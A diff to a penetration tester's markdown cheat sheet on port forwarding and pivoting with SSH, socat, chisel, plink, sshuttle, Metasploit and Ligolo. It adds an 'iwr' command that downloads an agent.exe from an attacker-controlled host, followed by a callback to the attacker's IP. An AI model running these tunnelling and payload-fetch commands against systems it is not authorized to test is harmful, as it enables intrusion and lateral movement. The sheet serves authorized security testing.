@@ -24,61 +24,72 @@
     - [Ligolo](#ligolo)
 
 ## Port Fowarding
+
 ### SSH Tunneling/Local Port Forwarding  
+
 ```sh
 ssh user@<ip> -p port -L 8001:127.0.0.1:8080 -fN
 ```
 
 ### SSH Remote Port Forwarding
+
 ```sh
 ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 ```
 
 ### Socat - Port Forward
+
 ```sh
 ./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
 ```
 
 ### chisel  - Remote Port Forward 
-kali
+
 ```sh
+# kali
 ./chisel server -p <LISTEN_PORT> --reverse &
 ```
-Host
 ```cmd
+# windows
 ./chisel client <client_port>:<client_port> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
 ```
 
 ### Chisel - Local Port Forward
-Host  
+
 ```cmd
+# host
 ./chisel server -p <LISTEN_PORT>
 ```
-kali  
 ```sh
+# kali
 ./chisel client <client_port>:<client_port> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
 ```
 
 ### pklink - Remote Port Forward
+
 ```cmd
 cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
 ```
 
 ## Proxying - Network Pivoting
+
 ### sshuttle (Unix) - proxying  
+
 ```sh
 sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
 ```
 
 ### SSH + Proxychains
+
 edit /etc/proxychains.conf with socks4 127.0.0.1 8080
 ```sh
 ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
 ```
   
 ### chisel  - Reverse Proxy
-kali 
+
 ```sh
+# kali
 ./chisel server -p LISTEN_PORT --reverse &
 ```
 Host  
@@ -87,16 +98,18 @@ Host
 ```
 
 ### chisel - Forward Proxy  
+
 Host  
 ```cmd
 ./chisel server -p <LISTEN_PORT> --socks5
 ```
-kali  
 ```sh
+# kali
 ./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
 ```
 
 ### metasploit - proxying 
+
 ```sh
 route add <ip>/24 1
 route print
@@ -108,21 +121,23 @@ run
 
 ### Ligolo
 
-https://github.com/nicocha30/ligolo-ng
-kali
+[about]( https://github.com/nicocha30/ligolo-ng)
 ```sh
+# kali
 sudo ip tuntap add user [your_username] mode tun ligolo
 sudo ip link set ligolo up
 ligolo-proxy -selfcert -laddr 0.0.0.0:<port>
 sudo ip route add <ip-range> dev ligolo
 ```
-host - upload agent
 ```
+# windows or host
+iwr -uri http://<ip>/agent.exe -Outfile agent.exe
 agent.exe -connect <attacker IP here>:<port> -ignore-cert
 ```
-kali
-```
+```sh
+# kali
 session
 start
-#test it
 ```
+
+ <!--- Last Updated July 8, 2024 --->
